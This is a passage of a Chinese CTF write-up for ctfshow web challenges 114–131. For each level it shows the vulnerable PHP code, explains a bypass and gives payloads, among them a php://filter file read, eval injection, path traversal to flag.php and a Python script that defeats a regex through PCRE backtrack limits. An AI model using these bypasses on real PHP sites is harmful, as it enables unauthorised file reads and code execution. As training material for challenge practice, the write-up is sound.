&quot;师傅们居然tql都是非预期 哼！&quot;;</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>compress</code>和<code>root</code>被ban掉了，</p>\n<p>山重水复疑无路，柳暗花明又一村</p>\n<p><code>filter</code>没有ban</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($num)&#123;</span><br><span class=\"line\">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    return $num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$num=$_GET[&#x27;num&#x27;];</span><br><span class=\"line\">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">    if($num==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;hacker!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!!!&quot;; </span><br></pre></td></tr></table></figure>\n\n<p><code>trim</code></p>\n<blockquote>\n<p> 去除字符串首尾处的空白字符（或者其他字符）</p>\n<p> 果不指定第二个参数，<strong>trim()</strong> 将去除这些字符</p>\n<ul>\n<li>“ “ (ASCII <em>32</em> (<em>0x20</em>))，普通空格符。</li>\n<li>“\\t” (ASCII <em>9</em> (<em>0x09</em>))，制表符。</li>\n<li>“\\n” (ASCII <em>10</em> (<em>0x0A</em>))，换行符。</li>\n<li>“\\r” (ASCII <em>13</em> (<em>0x0D</em>))，回车符。</li>\n<li>“\\0” (ASCII <em>0</em> (<em>0x00</em>))，空字节符。</li>\n<li>“\\x0B” (ASCII <em>11</em> (<em>0x0B</em>))，垂直制表符。</li>\n</ul>\n</blockquote>\n<p>这里我们写了个脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">for($i=1;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $a=chr($i).&#x27;1&#x27;;</span><br><span class=\"line\">    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;</span><br><span class=\"line\">        echo urlencode(chr($i));</span><br><span class=\"line\">        echo &quot;\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后跑出来的结果是 %0c(换页符)</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有个很坑的点</p>\n<blockquote>\n<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：<code>CTF[SHOW.COM</code>&#x3D;&gt;<code>CTF_SHOW.COM</code></p>\n</blockquote>\n<p>也就是说当我面<code>POST</code>  <code>CTF_SHOW.COM</code>时，会自动解析成<code>CTF_SHOW_COM</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>相比于上一题，题目过路的更多了，echo这些打印函数被过滤</p>\n<p>这里我们详细看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>$_SERVER[‘argv’]：</p>\n<p>1、cli模式（命令行）下</p>\n<pre><code>第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数\n</code></pre>\n<p>2、web网页模式下</p>\n<pre><code>在web页模式下必须在php.ini开启register_argc_argv配置项\n    \n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n    \n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n    \n$argv,$argc在web模式下不适用\n</code></pre>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">我们是在网页模式下的，注意重点：</span><br><span class=\"line\">$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class=\"line\">而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?$fl0g=flag_give_me;</span><br><span class=\"line\"></span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>\n\n<p>另一种思路</p>\n<p>这里没有过滤<code>highlight_file()</code>于是我们可以构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?1=flag.php</span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>与上题一样，这回多给几个payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n\n<p>数组中用加号(加号在url中起到空格的作用)分隔<code>$a[1]</code>对应的就是<code>fl0g=flag_give_me</code>，所以下面这种也是可以的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\">传入 a=1+fl0g=flag_give_me</span><br><span class=\"line\">结果如下</span><br><span class=\"line\">array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$ctf_show = md5($flag);</span><br><span class=\"line\">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//特殊字符检测</span><br><span class=\"line\">function waf($url)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(waf($url))&#123;</span><br><span class=\"line\">    die(&quot;嗯哼？&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    extract($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取的查询语句是服务端还没url解码的，所以url编码绕过即可：</p>\n</blockquote>\n<p>写个脚本跑一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function waf($num)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $num))&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class=\"line\">\t$num=chr($i);</span><br><span class=\"line\">\tif(waf($num))&#123;</span><br><span class=\"line\">\t\techo &quot;未编码：&quot;.$num.&quot;   经过编码：&quot;.urlencode(chr($i)).&quot;\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>空格可以绕过，%20</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class=\"line\">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(check($f1))&#123;</span><br><span class=\"line\">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;嗯哼？&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题我傻了。。，还是看大师傅的wp吧</p>\n<p>考察点是gettext拓展使用</p>\n<p>在开启该拓展后 _() 等效于 gettext()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo gettext(&quot;phpinfo&quot;);</span><br><span class=\"line\">结果  phpinfo</span><br><span class=\"line\"></span><br><span class=\"line\">echo _(&quot;phpinfo&quot;);</span><br><span class=\"line\">结果 phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>所以 <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> 返回的就是phpinfo</p>\n<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_defined_vars ( void ) : array</span><br><span class=\"line\">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_GET[&#x27;f&#x27;];</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class=\"line\">        echo readfile($f);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>路径穿越很简单</p>\n<p><code>../</code>   回到上一级目录</p>\n<p><code>./</code>    表示当前目录</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=../../ctfshow../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0</p>\n<p>if(0 &#x3D;&#x3D;&#x3D; flase)返回值为false0不是强等于false的</p>\n<p>stripos()函数对数组不识别，遇到数组会返回null，null!&#x3D;&#x3D;flase</p>\n</blockquote>\n<p>在&#x2F;s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f&#x3D;ctfshow就可以了</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=ctfshow[]</span><br><span class=\"line\">?f[]=1</span><br><span class=\"line\">?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)</span><br></pre></td></tr></table></figure>\n\n<p>下面就要介绍p神的PCRE回溯</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\" >https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>\n<p>我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>\n<p>脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>老老实实用PCRE回溯吧</p>\n<h3 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" 